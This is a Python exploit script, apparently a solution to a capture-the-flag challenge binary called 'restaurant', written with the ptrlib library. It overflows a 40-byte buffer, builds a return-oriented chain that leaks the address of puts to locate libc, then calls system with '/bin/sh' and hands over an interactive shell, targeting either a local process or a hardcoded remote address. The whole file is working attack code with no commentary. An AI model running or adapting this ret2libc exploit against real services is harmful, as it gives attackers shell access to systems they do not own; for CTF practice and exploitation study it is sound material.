#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./restaurant_patched")
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl = b"A" * 40
    pl += ptr.p64(next(exe.gadget("pop rdi; ret;")))
    pl += ptr.p64(unwrap(exe.got("puts")))
    pl += ptr.p64(unwrap(exe.plt("puts")))
    pl += ptr.p64(unwrap(exe.symbol("fill")))

    io.sendline("1")
    io.sendline(pl)
    io.recvuntil("@")
    libc.base = ptr.u64(io.recv(6)) - unwrap(libc.symbol("puts"))

    pl2 = b"A" * 40
    pl2 += ptr.p64(next(libc.gadget("ret;")))
    pl2 += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    pl2 += ptr.p64(next(libc.find("/bin/sh")))
    pl2 += ptr.p64(unwrap(libc.symbol("system")))

    io.sendline(pl2)
    io.sendline("echo pwned!")
    io.recvlineafter("pwned!")
    io.sh()


if __name__ == "__main__":
    main()
